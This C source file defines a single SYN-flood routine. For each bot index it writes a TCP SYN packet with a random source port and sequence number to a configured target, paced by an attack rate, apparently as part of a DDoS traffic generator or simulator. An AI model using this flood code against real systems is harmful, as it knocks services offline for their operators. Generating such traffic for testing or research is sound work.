#include "attacks.h"

u64
unit_synflood(FILE *f, u32 index)
{
	u8 src[4];

	bot_ip(index, src);
	send_tcp(f, src, g_atk.target, (u16)rng_range(1024, 65535),
	    g_atk.target_port, rng_range(1, 0xffffffffu), 0, TCP_SYN,
	    NULL, 0);
	return (1000000u / (g_atk.rate ? g_atk.rate : 1));
}
